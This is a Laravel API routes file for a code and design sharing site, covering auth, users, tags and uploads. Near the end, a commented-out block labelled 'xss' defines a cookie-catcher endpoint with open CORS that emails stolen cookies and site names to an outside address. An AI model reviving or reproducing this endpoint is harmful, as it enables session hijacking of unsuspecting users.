<?php

use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::group([
    'namespace' => 'Api',
], function () {
    // Handle on passed down request
//    header('Access-Control-Allow-Origin: ' . config('app.domain'));
//    header('Access-Control-Allow-Methods: ' . 'GET, POST, PATCH, PUT, DELETE, OPTIONS, HEAD');
//    header('Access-Control-Allow-Headers: ' . 'Content-Type, Accept, Cookie, X-Requested-With');
//    header('Access-Control-Allow-Credentials: ' . 'true');
    Route::post('test', function (Request $request) {
        return response($request->all());
    });
    Route::group([
        'namespace' => 'Auth',
    ], function () {
        Route::get('login', 'LoginController@login');
        Route::post('logout', 'LoginController@logout');
        Route::post('register', 'RegisterController@register');
    });

    Route::get('post/top', 'CodeController@top');
    Route::get('post/search', 'CodeController@searchSuggest');
    Route::resource('code', 'CodeController');
    Route::resource('design', 'DesignController');

    Route::get('tag', function () {
        return response()->json([
            'status' => 0,
            'msg' => 'ok',
            'data' => \App\Models\Tag::all()
        ]);
    });

    Route::group([
        'middleware' => 'auth.api'
    ], function () {
        Route::resource('users', 'UserController');
        Route::get('userinfo', function () {
            $user = Auth::user();
            if (!$user) {
                return response()->json([
                    'status' => 4,
                    'msg' => 'user not login'
                ]);
            }
            return response()->json([
                'status' => 0,
                'msg' => 'already login',
                'data' => $user
            ]);
        });

    });
    Route::post('upload/image', 'UploadController@image');

//    // xss
//    Route::get('cookie', function (Request $request) {
//        header('Access-Control-Allow-Origin: *');
//        header('Access-Control-Allow-Methods: ' . 'GET, POST, PATCH, PUT, DELETE, OPTIONS, HEAD');
//        header('Access-Control-Allow-Headers: ' . 'Content-Type, Accept, Cookie, X-Requested-With');
//        header('Access-Control-Allow-Credentials: ' . 'true');
//
//        Mail::to('13571899655@163.com')->send(new \App\Mail\UserNotify('success', $request->cookie, [], $request->website));
//    });

});
